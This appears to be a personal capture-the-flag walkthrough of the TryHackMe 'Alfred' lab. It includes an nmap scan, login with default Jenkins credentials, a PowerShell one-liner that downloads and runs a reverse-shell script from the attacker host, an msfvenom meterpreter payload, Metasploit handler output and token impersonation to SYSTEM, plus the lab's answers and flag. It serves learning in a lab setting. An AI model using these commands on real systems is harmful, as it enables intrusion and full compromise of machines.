# Nmap scan
```bash
┌──(kali㉿kali)-[~/thm/subs/alfred]
└─$sudo nmap -sSVC 10.10.254
# Nmap 7.91 scan initiated Sat Apr  3 09:28:57 2021 as: nmap -sSVC -o nmap_scan -Pn 10.10.254.83
Nmap scan report for 10.10.254.83
Host is up (0.37s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-04-02T12:52:01
|_Not valid after:  2021-10-02T12:52:01
|_ssl-date: 2021-04-03T13:54:53+00:00; -1s from scanner time.
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  3 09:54:54 2021 -- 1 IP address (1 host up) scanned in 1556.86 seconds
```
![[Pasted image 20210403085705.png]]
## Port 8080 enum
![[Pasted image 20210403092511.png]]
Task 1.1 -> How many ports are open? (TCP only)
Ans -> 3
Task 1.2 -> What is the username and password for the log in panel(in the format username:password)
Ans -> 

|admin|admin|
|--|--|

Task 1.3 ->What is the user.txt flag?
Ans -> 
http://10.10.254.83:8080/job/project/configure
Change the command to the exploit given below
```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.169.1:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.169.1 -Port 4444
```
# Priv esc
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```
Transfer shell
```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.169.1:8000/shell.exe','shell.exe')"
```
Lanch Exploit
```bash
Start-Process "shell.exe"
```
Metasploit 
```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.9.169.1
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.169.1:4444 
[*] Sending stage (175174 bytes) to 10.10.85.144
[*] Meterpreter session 1 opened (10.9.169.1:4444 -> 10.10.85.144:49213) at 2021-04-04 07:08:28 -0400

meterpreter >
```

Task 2 -> What is the final size of the exe payload that you generated?
Ans -> 73802
Shell catched.
# load tokens
```bash
meterpreter > migrate 668
[*] Migrating from 2276 to 668...
[*] Migration completed successfully.
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > list_tokens -g

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\AudioSrv
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CryptSvc
NT SERVICE\CscService
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\Dnscache
NT SERVICE\DPS
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\FontCache
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MMCSS
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\RpcEptMapper
NT SERVICE\RpcSs
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\sppsvc
NT SERVICE\sppuinotify
NT SERVICE\swprv
NT SERVICE\TermService
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WdiSystemHost
NT SERVICE\WinDefend
NT SERVICE\Winmgmt
NT SERVICE\wscsvc
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\ShellHWDetection
NT SERVICE\WinHttpAutoProxySvc

meterpreter >
```
# Escalation
```bash
meterpreter > impersonate_token "BUILTIN\Administrators"
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
# Root user
```bash
C:\Windows\System32\config>type root.txt
type root.txt
dff0f748678f280250f25a45b8046b4a
```